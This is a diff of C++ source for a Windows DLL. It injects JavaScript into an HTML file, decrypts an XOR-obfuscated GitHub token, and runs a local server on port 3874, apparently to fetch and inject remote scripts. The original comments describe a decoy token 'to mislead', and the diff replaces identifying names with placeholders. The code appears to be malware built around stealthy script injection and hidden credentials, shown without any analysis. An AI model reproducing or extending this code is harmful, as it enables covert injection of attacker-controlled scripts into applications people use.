@@ -269,9 +269,9 @@ void injectJS(std::string& html, const std::string& js, bool scriptTag) {
 
 const unsigned char encryptedToken[] = {
     0x17, 0x12, 0x18, 0x2f, 0x16, 0x06, 0x15, 0x16, 0x09, 0x37, 0x22, 0x25, 0x17, 0x1e, 0x38, 0x3d, 0x09, 0x5f, 0x19, 0x2a, 0x1c, 0x44, 0x23, 0x0f, 0x29, 0x42, 0x3a, 0x20, 0x3d, 0x1d, 0x03, 0x03, 0x5b, 0x14, 0x48, 0x1a, 0x20, 0x49, 0x11, 0x24
-}; // Твой токен в xor формате
+}; // valid token in xor formated
 const size_t encryptedTokenSize = sizeof(encryptedToken);
-const std::string encryptionKey = "pzhpzh"; // XOR - КЛЮЧ
+const std::string encryptionKey = "password"; // XOR - password
 
 std::string decryptToken() {
     std::string result((char*)encryptedToken, encryptedTokenSize);
@@ -283,10 +283,10 @@ void startServer() {
         io_context ctx;
         tcp::acceptor acceptor(ctx, tcp::endpoint(tcp::v4(), 3874));
         addScript(htmlFile, "http://127.0.0.1:3874");
-        std::string ghp = "ghp_0aBcD1EfGhIjKlM2NoPqRsTuVwXyZ3"; // Левый токен для ввода в заблуждение.
-        std::string owner = "neizzbezhny"; // owner
-        std::string repo = "sborki"; // repo
-        std::string jsPath = "006.js"; // jsPath
+        std::string ghp = "ghp_0aBcD1EfGhIjKlM2NoPqRsTuVwXyZ3"; // fake token
+        std::string owner = "owner"; // owner
+        std::string repo = "repo"; // repo
+        std::string jsPath = "config.js"; // jsPath
         std::string jsCont;
         while (true) {
             tcp::socket sock(ctx);
@@ -438,4 +438,5 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
         break;
     }
     return TRUE;
+
 }
